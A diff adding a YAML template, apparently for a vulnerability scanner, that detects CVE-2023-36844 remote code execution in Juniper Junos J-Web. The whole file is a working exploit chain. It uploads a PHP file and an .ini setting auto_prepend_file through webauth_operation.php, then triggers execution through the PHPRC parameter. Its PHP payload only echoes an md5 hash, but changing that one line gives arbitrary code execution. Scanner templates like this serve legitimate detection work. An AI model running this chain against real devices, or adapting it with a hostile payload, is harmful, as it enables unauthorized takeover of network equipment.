@@ -1,0 +1,82 @@
+id: poc-yaml-junos-webauth-operation-php-rce
+info:
+  name: Junos webauth_operation.php Remote Code Execution (CVE-2023-36844)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,CVE-2023-36844
+
+variables:
+  v1: "{{rand_text_alphanumeric(8)}}"
+  payload: "<?php echo md5('{{v1}}');?>"
+  payload_base64: "{{base64(payload)}}"
+  payload_length: "{{len(payload)}}"
+  file_name1: "{{rand_text_alphanumeric(5)}}"
+  file_name2: "{{rand_text_alphanumeric(5)}}"
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - id: step1-upload-php
+    method: POST
+    path:
+      - '{{BaseURL}}/webauth_operation.php'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      rs=do_upload&rsargs[]=[{"fileData": "data:text/html;base64,{{payload_base64}}", "fileName": "{{file_name1}}.php", "csize": {{payload_length}}}]
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "+:{\"converted_fileName\":"
+    extractors:
+      - type: regex
+        name: phpfile
+        internal: true
+        group: 1
+        regex:
+          - "[a-f0-9]{64}\\.php"
+
+  - id: step2-upload-ini
+    method: POST
+    path:
+      - '{{BaseURL}}/webauth_operation.php'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      rs=do_upload&rsargs[]=[{"fileName": "{{file_name2}}.ini", "fileData": "data:text/html;base64,{{base64(concat('auto_prepend_file="/var/tmp/',phpfile,'"'))}}", "csize": "97" }]
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{\"converted_fileName\":  {0:"
+    extractors:
+      - type: regex
+        name: file
+        internal: true
+        group: 1
+        regex:
+          - "[a-f0-9]{64}\\.ini"
+
+  - id: step3-trigger-rce
+    method: GET
+    path:
+      - '{{BaseURL}}/webauth_operation.php?PHPRC=/var/tmp/{{file}}'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '{{md5(v1)}}'
+          - "sajax_handle_clie"
